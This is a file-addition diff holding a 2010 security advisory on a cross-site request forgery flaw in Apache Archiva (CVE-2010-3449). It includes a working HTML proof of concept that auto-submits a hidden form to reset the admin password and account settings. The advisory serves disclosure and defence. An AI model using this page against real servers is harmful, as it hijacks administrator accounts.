@@ -1,0 +1,72 @@
+ANATOLIA SECURITY ADVISORY
+--------------------------------------
+
+### ADVISORY INFO ###
++ Title: Apache Archiva Cross-site Request Forgery Vulnerability
++ Advisory URL: http://www.anatoliasecurity.com/adv/as-adv-2010-001.txt
++ Advisory ID:  2010-001
++ Versions: Archiva 1.0 to 1.3.1
++ Date: 29/09/2010
++ CVE-ID: CVE-2010-3449
++ Vendor: The Apache Software Foundation
++ Impact: Gaining Administrator Privileges
++ CWE-ID: 352 
++ Credit: Anatolia Security 
++ References: http://archiva.apache.org/security.html
+
+
+### VULNERABLE PRODUCT ###
++ Apache Archiva: "Apache Archiva is an extensible repository management software that helps taking care of your 
+own personal or enterprise-wide build artifact repository. It is the perfect companion for build tools such as 
+Maven, Continuum, and ANT. Archiva offers several capabilities, amongst which remote repository proxying, security 
+access management, build artifact storage, delivery, browsing, indexing and usage reporting, extensible scanning 
+functionality... and many more!"
++ Homepage: http://archiva.apache.org
+
+
+
+### VULNERABILITY DETAILS ###
++ Description: Apache Archiva affects from Cross-site Request Forgery. Application don't check which form sends
+credentials. Technically, attacker can create a specially crafted page and force archiva administrators to view it 
+and change their credentials. For prevention from CSRF vulnerabilities, application needs anti-csrf token, captcha
+and asking old password for action like change password. Vulnerability patched by the Apache Archiva Team.
+
++ Exploit/POC: http://www.anatoliasecurity.com/exploits/archiva-csrf-poc.txt
+
+<!--
+
+-*-*- ANATOLIA SECURITY (c) 2010 -*-*-
+
+$ Title: Proof of Concept Code for Apache Archiva CSRF
+$ ADV-ID: 2010-001
+$ ADV-URL: http://www.anatoliasecurity.com/adv/as-adv-2010-001.txt
+$ Technical Details: http://www.anatoliasecurity.com
+
+* PoC created by Eliteman 
+~ mail: eliteman [~AT~] anatoliasecurity [~DOT~] com
+~ web: elite.anatoliasecurity.com
+
+-->
+<html>
+<head>
+<title> Apache Archiva CSRF PoC </title>
+</head>
+<body>
+<form id="userEditForm" name="useredit" action="http://archiva:8080/archiva/security/useredit.action" method="post">
+  <input type="hidden" name="user.username" value="admin" id="userEditForm_user_username"/>
+  <input type="hidden" name="user.fullName" value="OWNED0DAY" id="userEditForm_user_fullName"/>
+  <input type="hidden" name="user.email" value="0day@zer0day.com" id="userEditForm_user_email"/>
+  <input type="hidden" name="user.password" value="1337owned" id="userEditForm_user_password"/>
+  <input type="hidden" name="user.confirmPassword" value="1337owned" id="userEditForm_user_confirmPassword"/>
+  <input type="hidden" name="user.locked" value="true" id="userEditForm_user_locked"/>
+  <input type="hidden" name="__checkbox_user.locked" value="true" />
+  <input type="hidden" name="user.passwordChangeRequired" value="true" id="userEditForm_user_passwordChangeRequired"/>
+  <input type="hidden" name="__checkbox_user.passwordChangeRequired" value="true" />
+  <input type="hidden" name="username" value="admin" id="userEditForm_username"/>
+  <input type="hidden" id="userEditForm__submit" name="method:submit" value="Update"/>
+</form>
+<script type="text/javascript">
+  document.forms[0].submit();
+</script>
+</body>
+</html>
